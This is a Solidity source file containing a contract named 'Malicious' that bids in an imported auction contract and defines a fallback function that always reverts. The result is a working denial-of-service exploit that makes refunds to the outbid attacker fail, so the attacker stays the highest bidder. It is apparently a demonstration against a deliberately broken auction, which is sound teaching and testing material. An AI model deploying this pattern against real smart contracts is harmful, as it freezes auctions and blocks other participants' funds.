pragma solidity ^0.5.8;

import "./BrokenAuction.sol";

contract Malicious {
    Auction auction;

    event Deposit(address sender, uint amount);

    constructor(address auctionAddress) public {
        auction = Auction(auctionAddress);
    }

    function maliciousBid(string memory name) public payable {
        auction.bid.value(msg.value)(name);
    }

    function withdrawMoney() public {
        auction.withdraw();
    }

    function() external payable {
        // If money is sent to a contract and it doesnt has a recieve method it will always call a fallback function
        // so a transfer method on this contract will catch here
        revert();
    }
}
